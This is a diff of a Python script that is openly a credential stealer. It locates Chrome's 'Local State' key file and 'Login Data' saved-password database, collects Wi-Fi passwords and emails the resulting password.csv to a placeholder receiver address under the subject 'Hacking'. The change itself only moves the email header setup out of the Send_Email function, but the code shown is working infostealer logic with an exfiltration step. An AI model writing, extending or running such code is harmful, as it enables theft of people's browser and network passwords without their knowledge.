@@ -11,9 +11,14 @@ import shutil
 import json
 
 wifi_db = 'wifi.db'
-
 path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
 path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+
+ADDR = 'SENDER_EMAIL'
+msg = MIMEMultipart()
+msg['Subject'] = 'Hacking'
+msg['From'] = ADDR
+msg['To'] = 'RECEIVER_MAIL'
 
 def getPassword():
     with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
@@ -64,11 +69,6 @@ def Get_Wifi_Password():
                     wifi.close()
 
 def Send_Email():
-    ADDR = 'SENDER_EMAIL'
-    msg = MIMEMultipart()
-    msg['Subject'] = 'Hacking'
-    msg['From'] = ADDR
-    msg['To'] = 'RECEIVER_MAIL'
     try:
         file = open('password.csv', 'rb')
         att = MIMEBase('application', 'octet-stream')
